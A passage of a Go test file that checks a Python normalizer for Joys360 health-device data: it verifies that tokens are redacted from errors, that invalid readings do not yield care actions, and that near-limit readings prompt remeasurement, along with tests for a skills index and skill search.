	command = exec.Command(python, "builtin/research/med-guid/scripts/normalize_joys360.py", "--url-stdin", "--format", "json")
	command.Env = append(os.Environ(), "PYTHONUTF8=1", "PYTHONDONTWRITEBYTECODE=1")
	command.Stdin = strings.NewReader(sensitiveURL)
	output, err := command.CombinedOutput()
	if err == nil {
		t.Fatalf("unsupported sensitive URL unexpectedly succeeded: %s", output)
	}
	if strings.Contains(string(output), secret) || strings.Contains(string(output), "access_token") || strings.Contains(string(output), sensitiveURL) {
		t.Fatalf("sensitive URL leaked through normalizer error: %s", output)
	}

	malformedSecret := "TOPSECRET-MALFORMED-QUERY"
	malformedURL := "https://www.joys360.com/interface-server/api/getOneMachineHealthDataTCM?access_token=" + malformedSecret + " bad"
	command = exec.Command(python, "builtin/research/med-guid/scripts/normalize_joys360.py", "--url-stdin", "--format", "json")
	command.Env = append(os.Environ(), "PYTHONUTF8=1", "PYTHONDONTWRITEBYTECODE=1")
	command.Stdin = strings.NewReader(malformedURL)
	output, err = command.CombinedOutput()
	if err == nil {
		t.Fatalf("malformed sensitive URL unexpectedly succeeded: %s", output)
	}
	if strings.Contains(string(output), malformedSecret) || strings.Contains(string(output), "access_token") || strings.Contains(string(output), malformedURL) || strings.Contains(string(output), "Traceback") {
		t.Fatalf("malformed sensitive URL leaked through normalizer error: %s", output)
	}

	command = exec.Command(python, "builtin/research/med-guid/scripts/normalize_joys360.py", "--url", sensitiveURL, "--format", "json")
	command.Env = append(os.Environ(), "PYTHONUTF8=1", "PYTHONDONTWRITEBYTECODE=1")
	output, err = command.CombinedOutput()
	if err == nil {
		t.Fatalf("legacy URL argument unexpectedly remained enabled: %s", output)
	}
	if strings.Contains(string(output), secret) || strings.Contains(string(output), "access_token") || strings.Contains(string(output), sensitiveURL) {
		t.Fatalf("legacy URL argument leaked through normalizer error: %s", output)
	}
}

func TestMedGuidNormalizerUsesOnlyActionableFactsForCareActions(t *testing.T) {
	python, err := exec.LookPath("python3")
	if err != nil {
		python, err = exec.LookPath("python")
	}
	if err != nil {
		t.Skip("python is unavailable")
	}

	payload, err := json.Marshal(map[string]interface{}{
		"header": map[string]interface{}{"code": 0},
		"body": map[string]interface{}{"list": []map[string]interface{}{
			{"abbrName": "MFBG_RISK_PROB", "name": "空腹血糖水平高于5.5mmol/L的风险", "score": ""},
			{"abbrName": "BP_SYSTOLIC", "name": "收缩压", "score": "999"},
			{"abbrName": "HBA1C_RISK_PROB", "name": "糖化血红蛋白水平高于5.7%的风险", "score": "10"},
			{"abbrName": "HBA1C_RISK_PROB", "name": "糖化血红蛋白水平高于5.7%的风险", "score": "80"},
			{"abbrName": "SNR", "name": "信噪比", "score": "20"},
			{"abbrName": "FUTURE_CONTEXT_ONLY", "name": "未来元数据", "score": "4"},
		}},
	})
	if err != nil {
		t.Fatal(err)
	}
	input := filepath.Join(t.TempDir(), "joys360-no-actionable.json")
	if err := os.WriteFile(input, payload, 0600); err != nil {
		t.Fatal(err)
	}
	run := func(format, mode string) []byte {
		t.Helper()
		args := []string{"builtin/research/med-guid/scripts/normalize_joys360.py", "--file", input, "--format", format}
		if mode != "" {
			args = append(args, "--mode", mode)
		}
		command := exec.Command(python, args...)
		command.Env = append(os.Environ(), "PYTHONUTF8=1", "PYTHONDONTWRITEBYTECODE=1")
		output, runErr := command.CombinedOutput()
		if runErr != nil {
			t.Fatalf("normalizer failed: %v\n%s", runErr, output)
		}
		return output
	}

	var normalized struct {
		Result struct {
			Quality struct {
				Level string `json:"level"`
			} `json:"quality"`
			Coverage struct {
				ValidValues      int `json:"valid_values"`
				ActionableValues int `json:"actionable_values"`
			} `json:"coverage"`
			Metrics []struct {
				ID                    string `json:"id"`
				RemeasurementPriority string `json:"remeasurement_priority"`
			} `json:"metrics"`
		} `json:"result"`
	}
	if err := json.Unmarshal(run("json", ""), &normalized); err != nil {
		t.Fatal(err)
	}
	if normalized.Result.Quality.Level != "insufficient" || normalized.Result.Coverage.ValidValues != 2 || normalized.Result.Coverage.ActionableValues != 0 {
		t.Fatalf("context-only/quarantined facts were treated as actionable: %#v", normalized.Result)
	}
	promptRemeasurement := false
	for _, metric := range normalized.Result.Metrics {
		if metric.ID == "BP_SYSTOLIC" && metric.RemeasurementPriority == "prompt" {
			promptRemeasurement = true
		}
	}
	if !promptRemeasurement {
		t.Fatal("out-of-range device value should retain a prompt standard-remeasurement preparation flag")
	}

	for _, mode := range []string{"standard", "full"} {
		report := string(run("report", mode))
		if !strings.Contains(report, "没有取得可用于结论的有效指标") || !strings.Contains(report, "立即用经过验证的标准设备") {
			t.Fatalf("%s report did not produce a limitation-aware remeasurement note: %s", mode, report)
		}
		for _, forbidden := range []string{"讨论是否需要标准空腹血糖和 HbA1c", "我是否需要家庭血压监测"} {
			if strings.Contains(report, forbidden) {
				t.Fatalf("%s report derived a specific care action from quarantined data %q: %s", mode, forbidden, report)
			}
		}
		if mode == "full" && !strings.Contains(report, "仅凭当前无效资料不能指定科室") {
			t.Fatalf("full report assigned normal routing without actionable facts: %s", report)
		}
	}
}

func TestMedGuidNormalizerBoundsAndDowngradesUnknownQualityNotes(t *testing.T) {
	python, err := exec.LookPath("python3")
	if err != nil {
		python, err = exec.LookPath("python")
	}
	if err != nil {
		t.Skip("python is unavailable")
	}

	notes := make([]string, 512)
	for i := range notes {
		notes[i] = fmt.Sprintf("NOTE_NEW_SENSOR_%03d", i)
	}
	payload, err := json.Marshal(map[string]interface{}{
		"header": map[string]interface{}{"code": 0},
		"body": map[string]interface{}{"list": []map[string]interface{}{
			{"abbrName": "HR_BPM", "name": "心率(bpm)", "score": "80", "tabList": notes},
		}},
	})
	if err != nil {
		t.Fatal(err)
	}
	input := filepath.Join(t.TempDir(), "joys360-note-overflow.json")
	if err := os.WriteFile(input, payload, 0600); err != nil {
		t.Fatal(err)
	}
	run := func(format string) []byte {
		t.Helper()
		command := exec.Command(python, "builtin/research/med-guid/scripts/normalize_joys360.py", "--file", input, "--format", format, "--mode", "standard")
		command.Env = append(os.Environ(), "PYTHONUTF8=1", "PYTHONDONTWRITEBYTECODE=1")
		output, runErr := command.CombinedOutput()
		if runErr != nil {
			t.Fatalf("normalizer failed: %v\n%s", runErr, output)
		}
		return output
	}
	jsonOutput := run("json")
	if strings.Contains(string(jsonOutput), "NOTE_NEW_SENSOR_000") {
		t.Fatalf("unknown raw quality code leaked into normalized output: %s", jsonOutput)
	}
	var normalized struct {
		Result struct {
			Quality struct {
				Level string `json:"level"`
				Notes []struct {
					Code string `json:"code"`
				} `json:"notes"`
				Issues []struct {
					Code  string `json:"code"`
					Count int    `json:"count"`
				} `json:"normalization_issues"`
			} `json:"quality"`
			Metrics []struct {
				QualityLevel string `json:"quality_level"`
			} `json:"metrics"`
		} `json:"result"`
	}
	if err := json.Unmarshal(jsonOutput, &normalized); err != nil {
		t.Fatal(err)
	}
	if normalized.Result.Quality.Level != "limited" || len(normalized.Result.Quality.Notes) != 1 || normalized.Result.Quality.Notes[0].Code != "NOTE_UNRECOGNIZED" || normalized.Result.Metrics[0].QualityLevel != "limited" {
		t.Fatalf("unknown notes were not conservatively collapsed: %#v", normalized.Result)
	}
	issueCounts := make(map[string]int)
	for _, issue := range normalized.Result.Quality.Issues {
		issueCounts[issue.Code] = issue.Count
	}
	if issueCounts["quality_note_overflow"] != 448 || issueCounts["unrecognized_quality_notes"] != 512 {
		t.Fatalf("quality-note bounds were not summarized: %v", issueCounts)
	}
	report := string(run("report"))
	if len(report) > 20000 || strings.Count(report, "\n") > 300 || strings.Contains(report, "NOTE_NEW_SENSOR_") {
		t.Fatalf("quality notes amplified the rendered report: bytes=%d lines=%d\n%s", len(report), strings.Count(report, "\n")+1, report)
	}
}

func TestMedGuidNormalizerFlagsNearMachineBoundaryValuesForPromptRemeasurement(t *testing.T) {
	python, err := exec.LookPath("python3")
	if err != nil {
		python, err = exec.LookPath("python")
	}
	if err != nil {
		t.Skip("python is unavailable")
	}
	payload := []byte(`{"header":{"code":0},"body":{"list":[{"abbrName":"BP_SYSTOLIC","name":"收缩压","score":349},{"abbrName":"HR_BPM","name":"心率(bpm)","score":299},{"abbrName":"TEMPERATURE_SENSOR","name":"体温","score":49},{"abbrName":"IHB_COUNT","name":"不规则心跳","score":0},{"abbrName":"HRV_SDNN","name":"心率变异性","score":40}]}}`)
	input := filepath.Join(t.TempDir(), "joys360-boundary.json")
	if err := os.WriteFile(input, payload, 0600); err != nil {
		t.Fatal(err)
	}
	command := exec.Command(python, "builtin/research/med-guid/scripts/normalize_joys360.py", "--file", input, "--format", "bundle", "--mode", "concise")
	command.Env = append(os.Environ(), "PYTHONUTF8=1", "PYTHONDONTWRITEBYTECODE=1")
	output, err := command.CombinedOutput()
	if err != nil {
		t.Fatalf("normalizer failed: %v\n%s", err, output)
	}
	var bundle struct {
		Report string `json:"report"`
		Result struct {
			Metrics []struct {
				RemeasurementPriority string `json:"remeasurement_priority"`
			} `json:"metrics"`
		} `json:"result"`
	}
	if err := json.Unmarshal(output, &bundle); err != nil {
		t.Fatal(err)
	}
	for index, metric := range bundle.Result.Metrics[:3] {
		if metric.RemeasurementPriority != "prompt" {
			t.Fatalf("metric %d boundary priority=%q want prompt", index, metric.RemeasurementPriority)
		}
	}
	for index, metric := range bundle.Result.Metrics[3:] {
		if metric.RemeasurementPriority != "routine" {
			t.Fatalf("ordinary count/variability metric %d priority=%q want routine", index+3, metric.RemeasurementPriority)
		}
	}
	if !strings.Contains(bundle.Report, "接近或超出脚本的机器数据边界") || !strings.Contains(bundle.Report, "立即用经过验证的标准设备") {
		t.Fatalf("concise report did not prioritize prompt remeasurement: %s", bundle.Report)
	}
}

func TestBuiltinIndexExposesPresentationRoutingSkills(t *testing.T) {
	data, err := os.ReadFile("builtin/OPENKITTY_INDEX.json")
	if err != nil {
		t.Fatal(err)
	}
	var index map[string]struct {
		Desc   string   `json:"desc"`
		Skills []string `json:"skills"`
	}
	if err := json.Unmarshal(data, &index); err != nil {
		t.Fatal(err)
	}
	slides, ok := index["slides-decks"]
	if !ok {
		t.Fatal("missing slides-decks category")
	}
	for _, want := range []string{
		"presentation",
		"ppt-art-director",
		"ppt-master",
		"base-ppt",
		"paper-operators-visual",
	} {
		if !containsString(slides.Skills, want) {
			t.Fatalf("slides-decks index missing %q: %v", want, slides.Skills)
		}
	}
	if !strings.Contains(slides.Desc, "art-directed autonomous routing") {
		t.Fatalf("slides-decks desc should mention autonomous art direction: %q", slides.Desc)
	}
}

func TestBuiltinIndexUsesCanonicalNovaCommunityName(t *testing.T) {
	data, err := os.ReadFile("builtin/OPENKITTY_INDEX.json")
	if err != nil {
		t.Fatal(err)
	}
	var index map[string]struct {
		Desc   string   `json:"desc"`
		Skills []string `json:"skills"`
	}
	if err := json.Unmarshal(data, &index); err != nil {
		t.Fatal(err)
	}
	communication, ok := index["communication"]
	if !ok {
		t.Fatal("missing communication category")
	}
	if !containsString(communication.Skills, "nova-community") {
		t.Fatalf("communication index should expose canonical nova-community: %v", communication.Skills)
	}
}

func TestGetTopSkillsIncludesIndexedBuiltinMetadata(t *testing.T) {
	loader := NewSkillsLoader(".", "", "")
	fsys := fstest.MapFS{
		"builtin/OPENKITTY_INDEX.json": &fstest.MapFile{Data: []byte(`{"communication":{"desc":"chat","skills":["indexed-skill"]}}`)},
		"builtin/indexed-skill/SKILL.md": &fstest.MapFile{Data: []byte(`---
name: Indexed Skill
description: Handles publish and reply actions.
tags:
  - publish
read_when:
  - reply to several visible items
---
# Indexed Skill

Use this skill for publish/reply workflows.
`)},
	}
	if err := loader.LoadBuiltinSkillsFromFS(fsys, "builtin"); err != nil {
		t.Fatalf("LoadBuiltinSkillsFromFS failed: %v", err)
	}

	top := loader.GetTopSkills([]string{"reply"}, 3)
	if !containsString(top, "indexed-skill") {
		t.Fatalf("indexed builtin skill should be matched from metadata/content, got: %v", top)
	}
}

func TestSearchSkillsDescriptionSummaryKeepsTailTriggers(t *testing.T) {
	loader := NewSkillsLoader(".", "", "")
	filler := strings.Repeat("general routing filler ", 120)
	desc := filler + "tail trigger: publish replies"
	fsys := fstest.MapFS{
		"builtin/OPENKITTY_INDEX.json": &fstest.MapFile{Data: []byte(`{"communication":{"desc":"chat","skills":["tail-skill"]}}`)},
		"builtin/tail-skill/SKILL.md": &fstest.MapFile{Data: []byte(`---
name: tail-skill
description: >-
  ` + desc + `
---
# Tail Skill

Use the tool after discovery.
`)},
	}
	if err := loader.LoadBuiltinSkillsFromFS(fsys, "builtin"); err != nil {
		t.Fatalf("LoadBuiltinSkillsFromFS failed: %v", err)
	}

	out := loader.SearchSkills([]string{"publish"}, 1, false)
	if !strings.Contains(out, "tail trigger: publish replies") {
		t.Fatalf("search result should preserve description tail trigger, got: %s", out)
	}
}
